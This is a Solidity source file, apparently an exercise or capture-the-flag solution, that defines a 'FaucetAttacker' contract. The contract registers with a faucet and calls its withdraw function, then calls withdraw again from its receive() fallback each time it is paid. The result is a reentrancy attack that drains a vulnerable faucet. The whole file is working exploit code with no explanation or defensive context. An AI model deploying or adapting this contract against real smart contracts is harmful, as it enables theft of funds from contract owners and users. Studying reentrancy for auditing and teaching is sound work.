// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFaucet {
    function register(address user) external;

    function withdraw() external payable;
}

contract FaucetAttacker {
    address faucetAddress;
    IFaucet faucet;

    constructor(address _faucetAddress) {
        faucetAddress = _faucetAddress;
        faucet = IFaucet(faucetAddress);
        faucet.register(address(this));
    }

    function attack() external {
        faucet.withdraw();
    }

    receive() external payable {
        IFaucet(faucetAddress).withdraw();
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}